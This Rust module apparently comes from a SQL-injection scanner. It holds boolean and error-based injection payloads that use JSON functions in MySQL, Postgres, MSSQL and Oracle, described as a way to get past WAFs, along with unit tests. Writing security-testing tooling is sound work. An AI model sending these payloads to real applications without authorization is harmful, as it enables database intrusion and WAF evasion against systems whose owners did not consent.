#![deny(unsafe_code)]

//! JSON-function SQLi payloads per DBMS.
//!
//! Apps storing JSON (configs, preferences, API blobs) often splice user input
//! into `JSON_EXTRACT` / `->>` / `JSON_VALUE` expressions. A quote break-out
//! there behaves like classic SQLi but signature WAFs tuned for `OR 1=1` can
//! miss the JSON context — hence dedicated boolean + error probes.
//!
//! Each [`JsonPayload`] carries a TRUE/FALSE boolean pair plus one error
//! probe. The error probe embeds the `__bad__` sentinel document (invalid
//! JSON everywhere): MySQL raises `Invalid JSON text`, Postgres
//! `invalid input syntax for type json`, MSSQL
//! `JSON text is not properly formatted`. Oracle uses a malformed path
//! (`$..[`, ORA-40442) since `JSON_VALUE` on lax documents may not raise.

/// Sentinel invalid JSON document embedded in error probes.
///
/// Chosen to be invalid JSON on every DBMS while remaining a plausible probe
/// body; integration mocks key off it to return per-DBMS error text.
pub const BAD_DOC: &str = "__bad__";

#[derive(Debug, Clone)]
#[non_exhaustive]
pub struct JsonPayload {
    pub true_payload: String,
    pub false_payload: String,
    pub error_payload: String,
    pub dbms: String,
}

impl JsonPayload {
    #[must_use]
    pub fn new(
        true_payload: impl Into<String>,
        false_payload: impl Into<String>,
        error_payload: impl Into<String>,
        dbms: impl Into<String>,
    ) -> Self {
        Self {
            true_payload: true_payload.into(),
            false_payload: false_payload.into(),
            error_payload: error_payload.into(),
            dbms: dbms.into(),
        }
    }
}

#[must_use]
pub fn json_payloads_for(dbms: Option<&str>) -> Vec<JsonPayload> {
    match dbms {
        Some("mysql") => vec![
            JsonPayload::new(
                "' OR JSON_EXTRACT('{\"k\":1}', '$.k')=1 -- -",
                "' OR JSON_EXTRACT('{\"k\":1}', '$.k')=2 -- -",
                format!("' AND JSON_EXTRACT('{BAD_DOC}', '$') -- -"),
                "mysql",
            ),
            JsonPayload::new(
                "' OR '{\"k\":1}'->>'$.k'='1' -- -",
                "' OR '{\"k\":1}'->>'$.k'='2' -- -",
                format!("' AND JSON_UNQUOTE(JSON_EXTRACT('{BAD_DOC}', '$'))='1' -- -"),
                "mysql",
            ),
        ],
        Some("postgres") => vec![
            JsonPayload::new(
                "' OR ('{\"k\":1}'::json->>'k')='1' --",
                "' OR ('{\"k\":1}'::json->>'k')='2' --",
                format!("' AND ('{BAD_DOC}'::json->>'k')='1' --"),
                "postgres",
            ),
            JsonPayload::new(
                "' OR ('{\"k\":1}'::jsonb->>'k')='1' --",
                "' OR ('{\"k\":1}'::jsonb->>'k')='2' --",
                format!("' AND ('{BAD_DOC}'::jsonb->'k')='1' --"),
                "postgres",
            ),
        ],
        Some("mssql") => vec![
            JsonPayload::new(
                "' OR JSON_VALUE('{\"k\":1}','$.k')='1' --",
                "' OR JSON_VALUE('{\"k\":1}','$.k')='2' --",
                format!("' AND JSON_VALUE('{BAD_DOC}','$.k')='1' --"),
                "mssql",
            ),
            JsonPayload::new(
                "' OR (SELECT value FROM OPENJSON('{\"k\":1}') WHERE [key]='k')='1' --",
                "' OR (SELECT value FROM OPENJSON('{\"k\":1}') WHERE [key]='k')='2' --",
                format!("' AND (SELECT value FROM OPENJSON('{BAD_DOC}'))='1' --"),
                "mssql",
            ),
        ],
        Some("oracle") => vec![
            JsonPayload::new(
                "' OR JSON_VALUE('{\"k\":1}', '$.k')='1' --",
                "' OR JSON_VALUE('{\"k\":1}', '$.k')='2' --",
                "' AND JSON_VALUE('{\"k\":1}', '$..[')='1' --",
                "oracle",
            ),
            JsonPayload::new(
                "' OR CASE WHEN JSON_EXISTS('{\"k\":1}', '$.k') THEN 1 ELSE 0 END=1 --",
                "' OR CASE WHEN JSON_EXISTS('{\"k\":1}', '$.k') THEN 1 ELSE 0 END=0 --",
                "' AND JSON_EXISTS('{\"k\":1}', '$..[')=1 --",
                "oracle",
            ),
        ],
        _ => vec![
            JsonPayload::new(
                "' OR JSON_EXTRACT('{\"k\":1}', '$.k')=1 -- -",
                "' OR JSON_EXTRACT('{\"k\":1}', '$.k')=2 -- -",
                format!("' AND JSON_EXTRACT('{BAD_DOC}', '$') -- -"),
                "mysql",
            ),
            JsonPayload::new(
                "' OR ('{\"k\":1}'::json->>'k')='1' --",
                "' OR ('{\"k\":1}'::json->>'k')='2' --",
                format!("' AND ('{BAD_DOC}'::json->>'k')='1' --"),
                "postgres",
            ),
            JsonPayload::new(
                "' OR JSON_VALUE('{\"k\":1}','$.k')='1' --",
                "' OR JSON_VALUE('{\"k\":1}','$.k')='2' --",
                format!("' AND JSON_VALUE('{BAD_DOC}','$.k')='1' --"),
                "mssql",
            ),
        ],
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn mysql_pair_and_error_probe() {
        let v = json_payloads_for(Some("mysql"));
        assert_eq!(v.len(), 2);
        for p in &v {
            assert_eq!(p.dbms, "mysql");
            assert!(p.true_payload.contains("JSON_EXTRACT") || p.true_payload.contains("->>"));
            assert!(p.error_payload.contains(BAD_DOC), "got {}", p.error_payload);
            assert!(
                p.true_payload.ends_with("-- -"),
                "mysql comment: {}",
                p.true_payload
            );
        }
    }

    #[test]
    fn postgres_uses_cast_operators() {
        let v = json_payloads_for(Some("postgres"));
        assert_eq!(v.len(), 2);
        assert!(v[0].true_payload.contains("::json"));
        assert!(v[1].true_payload.contains("::jsonb"));
        for p in &v {
            assert!(
                p.true_payload.ends_with("--"),
                "pg comment: {}",
                p.true_payload
            );
            assert!(!p.true_payload.ends_with("-- -"));
        }
    }

    #[test]
    fn mssql_json_value_and_openjson() {
        let v = json_payloads_for(Some("mssql"));
        assert_eq!(v.len(), 2);
        assert!(v[0].true_payload.contains("JSON_VALUE"));
        assert!(v[1].true_payload.contains("OPENJSON"));
    }

    #[test]
    fn oracle_json_value_and_exists() {
        let v = json_payloads_for(Some("oracle"));
        assert_eq!(v.len(), 2);
        assert!(v[0].true_payload.contains("JSON_VALUE"));
        assert!(v[1].true_payload.contains("JSON_EXISTS"));
        // malformed path probe for ORA-40442
        assert!(
            v[0].error_payload.contains("$..["),
            "got {}",
            v[0].error_payload
        );
    }

    #[test]
    fn generic_covers_three_dbms() {
        let v = json_payloads_for(None);
        assert_eq!(v.len(), 3);
        let kinds: Vec<&str> = v.iter().map(|p| p.dbms.as_str()).collect();
        assert!(kinds.contains(&"mysql"));
        assert!(kinds.contains(&"postgres"));
        assert!(kinds.contains(&"mssql"));
    }

    #[test]
    fn true_false_differ_only_in_comparison() {
        for p in json_payloads_for(None) {
            assert_ne!(p.true_payload, p.false_payload);
            // same function context, different expected value
            let prefix_len = p
                .true_payload
                .char_indices()
                .zip(p.false_payload.char_indices())
                .take_while(|(a, b)| a.1 == b.1)
                .count();
            assert!(prefix_len > 10, "pair should share a long prefix");
        }
    }
}
